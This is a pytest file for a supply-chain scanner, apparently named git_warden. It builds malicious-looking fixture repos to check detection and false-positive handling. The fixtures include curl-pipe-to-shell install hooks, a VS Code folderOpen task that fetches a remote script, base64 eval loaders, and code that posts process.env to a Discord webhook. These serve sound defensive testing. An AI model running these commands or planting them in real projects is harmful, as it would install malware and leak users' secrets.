"""Tests for the supply-chain static scanners (manifest + content) and that a
malicious npm/PyPI-style repo now CONFIRMS in Tier-2 (the recall fix, P2)."""

from __future__ import annotations

import base64
import json

from git_warden.scanning.content_scanner import scan_content
from git_warden.scanning.manifest_scanner import scan_manifests
from git_warden.scanning.tier2 import analyze_repo


def test_manifest_flags_malicious_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {"postinstall": "curl http://evil.tld/x | sh"}}),
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" and f.rule == "npm-postinstall" for f in findings)


def test_manifest_ignores_benign_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "ok", "scripts": {"postinstall": "node-gyp rebuild"}}),
        encoding="utf-8",
    )
    assert scan_manifests(tmp_path) == []  # no suspicious command -> no flag


def test_manifest_flags_setup_py_exec(tmp_path):
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nimport os\nos.system('curl http://evil|sh')\nsetup()\n",
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" for f in findings)


def test_content_flags_obfuscated_js(tmp_path):
    (tmp_path / "index.js").write_text(
        "const p = eval(atob('Y29uc29sZQ=='));\n"
        "require('child_process').exec('id');\n"
        "fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'});\n",
        encoding="utf-8",
    )
    cats = {f.category for f in scan_content(tmp_path)}
    assert "obfuscation" in cats
    assert "code_execution" in cats
    assert "network_exfil" in cats


def test_malicious_npm_repo_confirms_in_tier2(tmp_path):
    # The whole point: a JS supply-chain repo (no bash) now confirms.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "stealer", "scripts": {"postinstall": "node steal.js"}}),
        encoding="utf-8",
    )
    (tmp_path / "steal.js").write_text(
        "const d = eval(atob('eA=='));\n"
        "fetch('https://discord.com/api/webhooks/9/z', "
        "{method:'POST', body: JSON.stringify(process.env)});\n",
        encoding="utf-8",
    )
    result = analyze_repo(tmp_path, "evil/stealer")
    assert result.confirmed
    assert result.bash_score >= 5
    assert any(f.category == "network_exfil" for f in result.bash_findings)


def test_eval_decoded_confirms_only_when_payload_is_malicious(tmp_path):
    # The confirm-alone eval-decoded rule now DECODES the payload and requires
    # malicious indicators, so it confirms a real injected stealer...
    mal = base64.b64encode(b"global['_']=require;require('child_process').exec(0)").decode()
    (tmp_path / "postcss.config.js").write_text(f"e={{}};eval(atob('{mal}'))\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "evil/a")
    assert res.confirmed
    assert any(f.rule == "eval-decoded" for f in res.bash_findings)


def test_eval_decoded_dropped_when_payload_is_benign(tmp_path):
    # ...but a benign decoded payload (eval(atob('hello world ...'))) is NOT
    # treated as malware -- no false-positive confirmation.
    benign = base64.b64encode(b"hello world, just a harmless string").decode()
    (tmp_path / "config.js").write_text(f"x=eval(atob('{benign}'))\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "ok/b")
    assert not res.confirmed
    assert not any(f.rule == "eval-decoded" for f in res.bash_findings)


def test_clean_js_repo_not_confirmed(tmp_path):
    (tmp_path / "index.js").write_text(
        "export function add(a, b) { return a + b; }\n", encoding="utf-8"
    )
    assert not analyze_repo(tmp_path, "good/lib").confirmed


def test_node_modules_excluded_from_scanning(tmp_path):
    # The tiledesk FP: legit deps `bytes` / `content-disposition` tripped js-exec.
    # Vendored trees are third-party; never attribute them to the target repo.
    dep = tmp_path / "node_modules" / "content-disposition"
    dep.mkdir(parents=True)
    (dep / "index.js").write_text("function f(){ return spawn('x'); }\n", encoding="utf-8")
    assert scan_content(tmp_path) == []


def test_python_rule_does_not_match_javascript(tmp_path):
    # `py-dyn` (compile()/__import__) must not fire on a .js file (tiledesk's
    # emaitransappRoute/index.js was flagged py-dyn). Language-gated now.
    (tmp_path / "index.js").write_text(
        "const re = compile(pattern);\nmodule.exports = re;\n", encoding="utf-8"
    )
    assert not any(f.rule == "py-dyn" for f in scan_content(tmp_path))


def test_minified_bundle_skipped(tmp_path):
    (tmp_path / "vendor.min.js").write_text(
        "var x=String.fromCharCode(1,2,3,4,5,6,7,8,9);\n", encoding="utf-8"
    )
    assert scan_content(tmp_path) == []


def test_legitimate_app_does_not_confirm(tmp_path):
    # A tiledesk-shaped legit app: references .env, uses child_process/exec, names
    # GITHUB_TOKEN in a Dockerfile ARG, runs host recon in CI. None of these are
    # malware signatures, so NOTHING here may confirm (the tiledesk FP did).
    (tmp_path / "index.js").write_text(
        "require('dotenv').config({path: '.env'});\n"
        "const { exec } = require('child_process');\n"
        "exec('node build.js');\n",
        encoding="utf-8",
    )
    (tmp_path / "Dockerfile").write_text(
        "FROM node:20\nARG GITHUB_TOKEN\nARG NPM_TOKEN\nRUN npm ci\n", encoding="utf-8"
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "jobs:\n  build:\n    steps:\n      - run: whoami\n", encoding="utf-8")
    result = analyze_repo(tmp_path, "tiledesk/email-transcription-app")
    assert not result.confirmed


def test_legit_setup_py_build_does_not_confirm(tmp_path):
    # hazyresearch/m2 + evo-design/evo FP: a setup.py that compiles extensions
    # and reads its version is NOT malware; only fetch-and-run is.
    (tmp_path / "setup.py").write_text(
        "import subprocess\n"
        "subprocess.check_output(['nvcc', '--version'])\n"
        "exec(open('version.py').read())\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/ml-lib").confirmed


def test_malicious_dependency_confirms(tmp_path):
    # A lure repo's own code is benign, but it declares a known-malicious package
    # -> installs malware on `npm install`. Tier-A confirmation.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "wallet-task",
                    "dependencies": {"@evil/stealer": "1.0.0", "react": "18"}}),
        encoding="utf-8",
    )
    res = analyze_repo(tmp_path, "attacker/crypto-task",
                       malicious_packages={"npm": frozenset({"@evil/stealer"})})
    assert res.confirmed
    assert any(f.category == "malicious_dependency" for f in res.bash_findings)


def test_malicious_pip_requirement_confirms(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "requests==2.31.0\nevil-stealer-pkg>=1.3\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "a/b",
                       malicious_packages={"pypi": frozenset({"evil-stealer-pkg"})})
    assert res.confirmed


def test_dependency_match_is_ecosystem_scoped(tmp_path):
    # The mockup FP: a legit npm package collided with a same-named RubyGems
    # typosquat. An npm dependency must only match npm malware.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"webpack-dev-server": "^4"}}),
        encoding="utf-8",
    )
    # "webpack-dev-server" is flagged on pypi here, NOT npm -> must not confirm.
    res = analyze_repo(tmp_path, "legit/app",
                       malicious_packages={"pypi": frozenset({"webpack-dev-server"})})
    assert not res.confirmed


def test_benign_dependencies_do_not_confirm(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"react": "18", "axios": "1"}}),
        encoding="utf-8",
    )
    res = analyze_repo(tmp_path, "legit/app",
                       malicious_packages={"npm": frozenset({"@evil/stealer"})})
    assert not res.confirmed


def test_vscode_task_autorun_confirms(tmp_path):
    # The DPRK lure vector OSM flagged on CoreX: a VS Code task that runs on
    # folderOpen, silently executing a fetch-and-run when the repo is opened.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "build", "type": "shell",
            "command": "curl -s http://185.4.2.9/a.sh | bash",
            "runOptions": {"runOn": "folderOpen"}}]}),
        encoding="utf-8",
    )
    res = analyze_repo(tmp_path, "attacker/lure")
    assert res.confirmed
    assert any(f.rule == "vscode-autorun" for f in res.bash_findings)


def test_vscode_task_manual_build_does_not_confirm(tmp_path):
    # A normal build task (not folderOpen) must not confirm.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "build", "type": "shell", "command": "npm run build"}]}),
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_test_fixture_files_excluded_from_confirmation(tmp_path):
    # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
    # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
    payload = (
        "fetch('https://discord.com/api/webhooks/1/x',"
        "{method:'POST',body:JSON.stringify(process.env)});\n"
    )
    (tmp_path / "index.test.ts").write_text(payload, encoding="utf-8")
    assert not analyze_repo(tmp_path, "detector/lib").confirmed   # in a test file
    (tmp_path / "index.ts").write_text(payload, encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lib").confirmed           # same code, shipped


def test_examples_dir_excluded_from_confirmation(tmp_path):
    ex = tmp_path / "examples"
    ex.mkdir()
    (ex / "demo.js").write_text(
        "const p = eval(atob('Y29uc29sZQ=='));\n", encoding="utf-8"
    )
    assert not analyze_repo(tmp_path, "lib/with-examples").confirmed


def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
    import git_warden.scanning.tier2 as t2
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = json.dumps({"issues": 2, "results": {"exfiltration": ["x"]}})
            stderr = ""
        return R()

    assert t2._run_external("guarddog", tmp_path, runner) == "flagged"
